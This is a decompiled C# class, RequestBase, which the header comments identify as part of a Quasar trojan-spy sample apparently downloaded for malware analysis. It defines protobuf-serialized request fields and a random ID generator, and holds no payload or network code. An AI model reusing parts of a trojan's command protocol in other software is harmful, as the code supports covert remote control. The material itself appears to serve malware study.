// Decompiled with JetBrains decompiler
// Type: NoiseMe.Drags.App.Models.Communication.RequestBase
// Assembly: Stubv2.0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E945C042-2241-44AF-B826-4AD3FC72B170
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Spy.MSIL.Quasar.gen-a3f98ee0a78f039e0a9ea52dba13c713dc46f749512bd7d108cc9c05f57fc93d.exe

using ProtoBuf;
using System;

namespace NoiseMe.Drags.App.Models.Communication
{
  [ProtoContract(Name = "RequestBase")]
  public class RequestBase : CommunicationObject
  {
    private string _name;
    private string _iD;
    private readonly string Letters;
    private readonly Random Randomizer;

    public RequestBase()
    {
      this.Randomizer = new Random();
      this.Letters = "qwertyuiopasdfghjklzxcvbnm1234567890QWERTYUIOPASDFGHJKLZXCVBNM";
    }

    [ProtoMember(1, Name = "Name")]
    public string Name
    {
      get => this._name;
      set
      {
        this._name = value;
        this.OnPropertyChanged(nameof (Name));
      }
    }

    [ProtoMember(2, Name = "ID")]
    public string ID
    {
      get
      {
        if (string.IsNullOrEmpty(this._iD))
        {
          this._iD = this.GenerateUniqueId(10);
          this.OnPropertyChanged(nameof (ID));
        }
        return this._iD;
      }
      set
      {
        this._iD = value;
        this.OnPropertyChanged(nameof (ID));
      }
    }

    public Response<T> CreateResponse<T>(T _responseBody)
    {
      Response<T> response = new Response<T>(_responseBody);
      response.ID = this.ID;
      return response;
    }

    private string GenerateUniqueId(int length)
    {
      string empty = string.Empty;
      for (int index = 0; index < length; ++index)
        empty += this.Letters[this.Randomizer.Next(0, this.Letters.Length - 1)].ToString();
      return empty;
    }
  }
}
